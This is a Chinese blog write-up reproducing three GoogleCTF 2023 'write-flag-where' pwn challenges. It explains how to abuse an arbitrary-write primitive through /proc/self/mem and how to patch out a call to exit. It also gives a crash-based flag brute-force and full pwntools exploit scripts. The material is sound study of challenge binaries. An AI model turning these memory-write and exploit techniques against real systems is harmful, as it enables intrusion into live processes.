<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>GoogleCTF2023复现 | Daily Study</title><meta name="author" content="C0KE"><meta name="copyright" content="C0KE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="GoogleCTF2023复现WRITE-FLAG-WHERE题目描述 This challenge is not a classical pwn In order to solve it will take skills of your own An excellent primitive you get for free Choose an address and I will write w">
<meta property="og:type" content="article">
<meta property="og:title" content="GoogleCTF2023复现">
<meta property="og:url" content="http://example.com/2024/07/10/GoogleCTF2023%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Daily Study">
<meta property="og:description" content="GoogleCTF2023复现WRITE-FLAG-WHERE题目描述 This challenge is not a classical pwn In order to solve it will take skills of your own An excellent primitive you get for free Choose an address and I will write w">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png">
<meta property="article:published_time" content="2024-07-10T04:04:54.171Z">
<meta property="article:modified_time" content="2024-07-10T07:51:03.127Z">
<meta property="article:author" content="C0KE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png"><link rel="shortcut icon" href="/img/fa.jpg"><link rel="canonical" href="http://example.com/2024/07/10/GoogleCTF2023%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'GoogleCTF2023复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-10 15:51:03'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">370</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">53</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Daily Study"><span class="site-name">Daily Study</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">GoogleCTF2023复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-10T04:04:54.171Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-10T07:51:03.127Z" title="更新于 2024-07-10 15:51:03">2024-07-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">赛题复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="GoogleCTF2023复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="GoogleCTF2023复现"><a href="#GoogleCTF2023复现" class="headerlink" title="GoogleCTF2023复现"></a>GoogleCTF2023复现</h1><h2 id="WRITE-FLAG-WHERE"><a href="#WRITE-FLAG-WHERE" class="headerlink" title="WRITE-FLAG-WHERE"></a>WRITE-FLAG-WHERE</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
<p>This challenge is not a classical pwn In order to solve it will take skills of your own An excellent primitive you get for free Choose an address and I will write what I see But the author is cursed or perhaps it’s just out of spite For the flag that you seek is the thing you will write ASLR isn’t the challenge so I’ll tell you what I’ll give you my mappings so that you’ll have a shot.</p>
</blockquote>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>该程序提供了一个可以任意地址写入flag的功能，于是我们思考如何才能把flag写入到一个能输出的位置即可，当我们直接通过写<code>/proc/self/mem</code>文件修改内存时，不受内存页保护的限制，可以向任意地址写值。故我们向<code>.rodata</code>段的字符串写flag就可以用<code>dprintf</code>将其打印出来。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3# -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;wfw1.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;have a shot.\n&#x27;</span>)</span><br><span class="line">image_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">b&#x27;-&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;image_addr: &#x27;</span> + <span class="built_in">hex</span>(image_addr))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Send me nothing and I will happily expire\n&quot;</span>,(<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x21e0</span>, <span class="number">80</span>)).encode())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>这里有个很有趣的点，导致该程序无法在本地无法调试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v9 = dup2(<span class="number">1</span>, <span class="number">1337</span>);</span><br><span class="line">v8 = open(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>);</span><br><span class="line">dup2(v8, <span class="number">0</span>);</span><br><span class="line">dup2(v8, <span class="number">1</span>);</span><br><span class="line">dup2(v8, <span class="number">2</span>);</span><br><span class="line">close(v8);</span><br></pre></td></tr></table></figure>

<p>这段C语言代码的作用是将标准输入、标准输出和标准错误输出重定向到 <code>/dev/null</code> 设备文件，实现丢弃所有的输入和输出。</p>
<p>将文件描述符 1（标准输出）复制到文件描述符 1337，并将文件描述符 1337 赋值给变量 v9。这一步是为了备份标准输出的文件描述符。但是本地运行还是会报错，因为本地的文件描述符(-n)的上限为1024所以这里无法有显示</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-t: cpu time (seconds)              unlimited</span><br><span class="line">-f: file size (blocks)              unlimited</span><br><span class="line">-d: data seg size (kbytes)          unlimited</span><br><span class="line">-s: stack size (kbytes)             8192</span><br><span class="line">-c: core file size (blocks)         0</span><br><span class="line">-m: resident set size (kbytes)      unlimited</span><br><span class="line">-u: processes                       31384</span><br><span class="line">-n: file descriptors                1024</span><br><span class="line">-l: locked-in-memory size (kbytes)  1013892</span><br><span class="line">-v: address space (kbytes)          unlimited</span><br><span class="line">-x: file locks                      unlimited</span><br><span class="line">-i: pending signals                 31384</span><br><span class="line">-q: bytes in POSIX msg queues       819200</span><br><span class="line">-e: max nice                        0</span><br><span class="line">-r: max rt priority                 0</span><br><span class="line">-N 15: rt cpu time (microseconds)   unlimited</span><br></pre></td></tr></table></figure>

<p>用下面的命令调高上限即可有显示，但是由于关闭了输入流还是没有交互。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -n 10240</span><br></pre></td></tr></table></figure>

<p>其实这里的1337保存的是一个设备，&#x2F;dev&#x2F;pts&#x2F;0 是 Linux 操作系统中伪终端（pseudo terminal）的设备文件之一。它是伪终端的一个实例，用于实现终端仿真和终端会话。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x55555555532f &lt;main+326&gt;    call   dprintf@plt                &lt;dprintf@plt&gt;</span><br><span class="line">       fd: 0x539 (/dev/pts/0)</span><br><span class="line">       fmt: 0x555555556050 ◂— 0x6168632073696854 (&#x27;This cha&#x27;)</span><br><span class="line">       vararg: 0x555555556050 ◂— 0x6168632073696854 (&#x27;This cha&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x5555555553be &lt;main+469&gt;    call   read@plt                &lt;read@plt&gt;</span><br><span class="line">       fd: 0x539 (/dev/pts/0)</span><br><span class="line">       buf: 0x7fffffffda10 ◂— 0x0</span><br><span class="line">       nbytes: 0x40</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出这里都是用的该设备，远程的话就不是这个设备了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x56146035f368 &lt;main+383&gt;    call   dprintf@plt                &lt;dprintf@plt&gt;</span><br><span class="line">       fd: 0x539 (socket:[303442])</span><br><span class="line">       fmt: 0x5614603601e0 ◂— &#x27;flag&#123;sasasasa&#125;\n&#x27;</span><br><span class="line">       vararg: 0x5614603601e0 ◂— &#x27;flag&#123;sasasasa&#125;\n&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>远程是用的socket这个设备，于是就可以实现交互了</p>
<h2 id="WRITE-FLAG-WHERE2"><a href="#WRITE-FLAG-WHERE2" class="headerlink" title="WRITE-FLAG-WHERE2"></a>WRITE-FLAG-WHERE2</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
<p>Was that too easy? Let’s make it tough<br>It’s the challenge from before, but I’ve removed all the fluff</p>
</blockquote>
<h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>在第一题基础上把<code>dprintf</code>输出字符串去掉了，但是有一处后门：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000000143</span>A</span><br><span class="line">.text:<span class="number">000000000000143</span>A                         loc_143A:                               ; CODE XREF: main+<span class="number">1</span>EF↑j</span><br><span class="line">.text:<span class="number">000000000000143</span>A <span class="number">90</span>                                      nop</span><br><span class="line">.text:<span class="number">000000000000143B</span></span><br><span class="line">.text:<span class="number">000000000000143B</span>                         loc_143B:                               ; CODE XREF: main+<span class="number">24F</span>↑j</span><br><span class="line">.text:<span class="number">000000000000143B</span> BF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          mov     edi, <span class="number">0</span>          ; status</span><br><span class="line">.text:<span class="number">0000000000001440</span> E8 <span class="number">8B</span> FC FF FF                          call    _exit</span><br><span class="line">.text:<span class="number">0000000000001445</span>                         ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000001445</span> <span class="number">8B</span> <span class="number">45</span> F4                                mov     eax, [rbp+var_C]</span><br><span class="line">.text:<span class="number">0000000000001448</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">15</span> <span class="number">86</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span>                    lea     rdx, aSomehowYouGotH ; <span class="string">&quot;Somehow you got here??\n&quot;</span></span><br><span class="line">.text:<span class="number">000000000000144F</span> <span class="number">48</span> <span class="number">89</span> D6                                mov     rsi, rdx        ; fmt</span><br><span class="line">.text:<span class="number">0000000000001452</span> <span class="number">89</span> C7                                   mov     edi, eax        ; fd</span><br><span class="line">.text:<span class="number">0000000000001454</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001459</span> E8 <span class="number">32</span> FC FF FF                          call    _dprintf</span><br><span class="line">.text:<span class="number">000000000000145</span>E E8 CD FB FF FF                          call    _abort</span><br></pre></td></tr></table></figure>

<p>于是我们可以通过flag的开头CTF去覆盖掉call exit，去执行后门的dprintf函数，</p>
<p>CTF转16进制后是“\x43\x54\x46”</p>
<p>于是我们可以构造下面这种类型的汇编去跳过call exit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; disasm(&quot;\x54&quot;)</span><br><span class="line">&#x27;   0:   54                      push   rsp&#x27;</span><br><span class="line">&gt;&gt;&gt; disasm(&quot;\xbf\x00\x00\x00\x43&quot;)</span><br><span class="line">&#x27;   0:   bf 00 00 00 43          mov    edi, 0x43000000&#x27;</span><br><span class="line">&gt;&gt;&gt; disasm(&quot;\x54\x54\x54\x54\x46&quot;)</span><br><span class="line">&#x27;   </span><br><span class="line">0:   54                      push   esp\n   </span><br><span class="line">1:   54                      push   esp\n   </span><br><span class="line">2:   54                      push   esp\n   </span><br><span class="line">3:   54                      push   esp\n   </span><br><span class="line">4:   46                      inc    esi</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure>

<p>再通过第一个题的方式输出flag</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">flaglen = <span class="number">13</span></span><br><span class="line"></span><br><span class="line">s = r.recvuntil(<span class="string">b&quot;\n\n&quot;</span>).decode().splitlines()[<span class="number">2</span>:]</span><br><span class="line">base = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> s:</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;chal&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> base <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    base = <span class="built_in">int</span>(line.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;stack&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">    stack = <span class="built_in">int</span>(line.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>].split()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base), <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop2</span>(<span class="params">addr</span>):</span><br><span class="line">  r.sendline(<span class="string">b&quot;0x%x 2&quot;</span> % (addr+base))</span><br><span class="line">  sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    nop2(<span class="number">0x1443</span>-i)</span><br><span class="line">r.sendline(<span class="string">b&quot;0x%x 127&quot;</span> % (<span class="number">0x20D5</span>+base))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Tips-1"><a href="#Tips-1" class="headerlink" title="Tips"></a>Tips</h3><p>除了上面那个修改call exit的方法还有一种爆破的方法</p>
<p>通过往“0x%llx %u”这串字符串的“0”写入flag的其中一个字符，再通过第二次输入的起始来看程序是否崩溃逐位爆破</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">offset, <span class="built_in">chr</span></span>):    </span><br><span class="line">	<span class="comment">#sh = remote(&#x27;wfw2.2023.ctfcompetition.com&#x27;, 1337)   </span></span><br><span class="line">	sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1338</span>)             </span><br><span class="line">	sh.recvuntil(<span class="string">b&#x27;fluff\n&#x27;</span>)    </span><br><span class="line">	image_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">b&#x27;-&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)    </span><br><span class="line">	sh.recvuntil(<span class="string">b&#x27;\n\n\n&#x27;</span>)    </span><br><span class="line">	sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (image_addr+<span class="number">0x20BC</span>-offset, offset+<span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;0&#x27;</span>))    </span><br><span class="line">	sh.send((<span class="string">&#x27;%cx%lx %u\n&#x27;</span> % (<span class="built_in">chr</span>, image_addr, <span class="number">0</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;0&#x27;</span>))    </span><br><span class="line">	<span class="keyword">try</span>:        </span><br><span class="line">		sh.recvn(<span class="number">1</span>, timeout=<span class="number">1</span>)        </span><br><span class="line">		sh.close()        </span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span>    </span><br><span class="line">	<span class="keyword">except</span> EOFError:       </span><br><span class="line">		sh.close()        </span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;_&#123;&#125;?&#x27;</span> + string.digits + string.ascii_lowercase + string.ascii_uppercase</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):    </span><br><span class="line">    find = <span class="literal">False</span>    </span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">chr</span> <span class="keyword">in</span> table:        </span><br><span class="line">        <span class="keyword">if</span> leak(<span class="built_in">len</span>(flag), <span class="built_in">chr</span>):            </span><br><span class="line">            find = <span class="literal">True</span>            </span><br><span class="line">            flag += <span class="built_in">chr</span>            </span><br><span class="line">            <span class="built_in">print</span>(flag)            </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> find:      </span><br><span class="line">        <span class="built_in">print</span>(flag)              </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#CTF&#123;sasasasa&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="WRITE-FLAG-WHERE3"><a href="#WRITE-FLAG-WHERE3" class="headerlink" title="WRITE-FLAG-WHERE3"></a>WRITE-FLAG-WHERE3</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
<p>Your skills are considerable, I’m sure you’ll agree But this final level’s toughness fills me with glee No writes to my binary, this I require For otherwise I will surely expire</p>
</blockquote>
<h3 id="解题过程一"><a href="#解题过程一" class="headerlink" title="解题过程一"></a>解题过程一</h3><p>官方给的方法是下面这个</p>
<blockquote>
<p>We can create a jump instruction using ‘}’ - it’s a two-byte instruction “jnp ”. We can make the second byte an unknown flag byte and prepare first an array of invalid instructions, and a nopsled afterwards. By modifying length of these two parts and checking whether we crash or not, we can brute force the flag character by character.</p>
</blockquote>
<p>大概意思就是说通过flag最后的“}”转义为”\x7D”，\x7D可以转义为一个二字节的跳转指令jge,然后通过爆破法逐位爆破。</p>
